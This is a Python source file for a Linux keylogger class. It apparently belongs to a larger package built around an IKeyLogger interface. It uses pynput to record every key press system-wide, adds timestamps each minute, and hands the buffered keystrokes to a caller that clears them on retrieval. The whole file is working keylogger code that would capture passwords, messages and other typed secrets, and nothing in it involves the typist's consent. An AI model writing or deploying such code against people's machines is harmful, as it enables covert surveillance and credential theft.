from pynput import keyboard
from typing import List
from .interfaces import IKeyLogger
from datetime import datetime
import threading

class LinuxKeyLogger(IKeyLogger):
    def __init__(self):
        self.key_buffer: List[str] = []
        self.buffer_lock = threading.Lock()
        self.running = False
        self.listener = None
        self.current_minute = ""

    def start_logging(self) -> None:
        self.running = True
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop_logging(self) -> None:
        self.running = False
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        with self.buffer_lock:
            keys = self.key_buffer.copy()
            self.key_buffer.clear()
            return keys

    def _on_press(self, key) -> bool:
        if not self.running:
            return False

        with self.buffer_lock:
            try:
                now = datetime.now()
                minute = now.strftime("%Y-%m-%d %H:%M")
                
                # Add timestamp if minute changed
                if self.current_minute != minute:
                    self.current_minute = minute
                    self.key_buffer.append(f"\n[{minute}] ")

                # Handle the key press
                if hasattr(key, 'char'):
                    if key.char is not None:
                        self.key_buffer.append(key.char)
                else:
                    # Handle special keys
                    if key == keyboard.Key.space:
                        self.key_buffer.append(' ')
                    elif key == keyboard.Key.enter:
                        self.key_buffer.append('\n')
                    elif key == keyboard.Key.tab:
                        self.key_buffer.append('\t')
                    else:
                        self.key_buffer.append(f'[{key}]')
                
                return True
            except Exception as e:
                print(f"Error in key processing: {e}")
                return True